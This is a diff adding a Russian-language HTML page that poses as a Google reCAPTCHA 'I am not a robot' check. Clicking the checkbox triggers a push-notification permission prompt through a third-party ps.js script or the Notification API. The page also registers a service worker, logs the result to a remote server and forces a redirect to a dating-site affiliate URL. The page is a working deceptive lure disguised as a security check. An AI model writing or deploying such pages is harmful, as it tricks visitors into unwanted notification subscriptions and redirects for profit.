@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="tlsdk" content="6ce3ce667cc14beabf44647a39a3694d">
+    <title>reCAPTCHA</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        .captcha-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 300px;
+            padding: 10px;
+            border: 1px solid #dfe1e5;
+            border-radius: 4px;
+            background-color: #fff;
+        }
+        .captcha-left {
+            display: flex;
+            align-items: center;
+        }
+        .captcha-checkbox {
+            margin-right: 10px;
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, border-color 0.3s ease;
+        }
+        .captcha-checkbox:checked {
+            background-color: #1a73e8;
+            border-color: #1a73e8;
+            animation: fillCheckbox 0.3s ease;
+        }
+        @keyframes fillCheckbox {
+            0% {
+                background-color: #fff;
+                border-color: #5f6368;
+            }
+            100% {
+                background-color: #1a73e8;
+                border-color: #1a73e8;
+            }
+        }
+        .captcha-text {
+            font-size: 14px;
+            color: #202124;
+        }
+        .captcha-right {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+        .captcha-logo {
+            width: 20px;
+            height: 20px;
+            margin-bottom: 5px;
+        }
+        .captcha-brand {
+            font-size: 12px;
+            color: #1a73e8;
+        }
+        .captcha-links {
+            font-size: 10px;
+            color: #5f6368;
+        }
+        .captcha-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+        .submit-button {
+            padding: 8px 16px;
+            background-color: #f1f3f4;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #202124;
+            cursor: pointer;
+        }
+        .submit-button:hover {
+            background-color: #e8eaed;
+        }
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+    </style>
+</head>
+<body>
+    <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q&sub_id=test_campaign" async></script>
+    <div class="container">
+        <div class="captcha-container">
+            <div class="captcha-left">
+                <input type="checkbox" id="captcha" class="captcha-checkbox">
+                <span class="captcha-text">Я не робот</span>
+            </div>
+            <div class="captcha-right">
+                <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
+                <span class="captcha-brand">reCAPTCHA</span>
+                <div class="captcha-links">
+                    <a href="https://policies.google.com/privacy" target="_blank">Конфиденциальность</a> - 
+                    <a href="https://policies.google.com/terms" target="_blank">Условия</a>
+                </div>
+            </div>
+        </div>
+        <div class="button-container">
+            <button class="submit-button" id="submit-button">Отправить</button>
+        </div>
+    </div>
+
+    <script>
+        // Регистрация Service Worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/HnFv7gIgUEyhZsQd8kp20Q.js')
+                .then(registration => {
+                    console.log('Service Worker зарегистрирован:', registration);
+                })
+                .catch(err => {
+                    console.error('Ошибка регистрации Service Worker:', err);
+                });
+        } else {
+            console.warn('Service Worker не поддерживается');
+        }
+
+        // Ссылка для редиректа
+        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd9';
+
+        // Функция для логирования подписки
+        function logSubscription(permission, subId = 'test_campaign') {
+            const data = {
+                id: 'HnFv7gIgUEyhZsQd8kp20Q',
+                sub_id: subId,
+                permission: permission,
+                timestamp: new Date().toISOString()
+            };
+            fetch('https://your-server.com/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => console.log('Лог подписки отправлен:', response))
+            .catch(err => console.error('Ошибка отправки лога:', err));
+        }
+
+        // Функция для выполнения редиректа
+        function performRedirect() {
+            console.log('Попытка редиректа на:', redirectUrl);
+            try {
+                window.location.href = redirectUrl;
+                setTimeout(() => {
+                    if (window.location.href !== redirectUrl) {
+                        window.location.replace(redirectUrl);
+                    }
+                }, 500);
+            } catch (e) {
+                console.error('Ошибка редиректа:', e);
+            }
+        }
+
+        // Функция для запроса подписки
+        function requestSubscription() {
+            // Проверяем статус уведомлений
+            if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
+                console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
+                logSubscription(Notification.permission);
+                setTimeout(performRedirect, 300);
+                return;
+            }
+
+            // Проверяем наличие API ps.js
+            if (window.ps && typeof window.ps.showPrompt === 'function') {
+                console.log('Вызываем подписку через ps.js');
+                const timeout = setTimeout(() => {
+                    console.log('Тайм-аут: ps.js не вернул результат');
+                    performRedirect();
+                }, 5000);
+
+                try {
+                    window.ps.showPrompt()
+                        .then(result => {
+                            clearTimeout(timeout);
+                            console.log('Результат подписки:', result);
+                            logSubscription(Notification.permission);
+                            performRedirect();
+                        })
+                        .catch(err => {
+                            clearTimeout(timeout);
+                            console.error('Ошибка вызова подписки:', err);
+                            logSubscription(Notification.permission);
+                            performRedirect();
+                        })
+                        .finally(() => {
+                            if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
+                                clearTimeout(timeout);
+                                console.log('Статус уведомлений:', Notification.permission);
+                                logSubscription(Notification.permission);
+                                performRedirect();
+                            }
+                        });
+                } catch (err) {
+                    clearTimeout(timeout);
+                    console.error('Синхронная ошибка в ps.js:', err);
+                    logSubscription('error');
+                    performRedirect();
+                }
+            } else {
+                console.log('API ps.js не доступен, используем Notification API');
+                if ('Notification' in window) {
+                    Notification.requestPermission()
+                        .then(permission => {
+                            console.log('Результат разрешения:', permission);
+                            logSubscription(permission);
+                            performRedirect();
+                        })
+                        .catch(err => {
+                            console.error('Ошибка Notification API:', err);
+                            logSubscription('error');
+                            performRedirect();
+                        });
+                } else {
+                    console.log('Уведомления не поддерживаются');
+                    logSubscription('unsupported');
+                    performRedirect();
+                }
+            }
+        }
+
+        // Функция проверки
+        function verify() {
+            const checkbox = document.getElementById('captcha');
+            if (checkbox.checked) {
+                setTimeout(requestSubscription, 300); // Задержка для анимации
+            }
+        }
+
+        // Событие на клик по чекбоксу
+        document.getElementById('captcha').addEventListener('click', () => {
+            const checkbox = document.getElementById('captcha');
+            if (!checkbox.checked) {
+                checkbox.checked = true; // Устанавливаем галочку при клике
+            }
+            verify();
+        });
+
+        // Событие на клик по кнопке
+        document.getElementById('submit-button').addEventListener('click', verify);
+    </script>
+</body>
+</html>
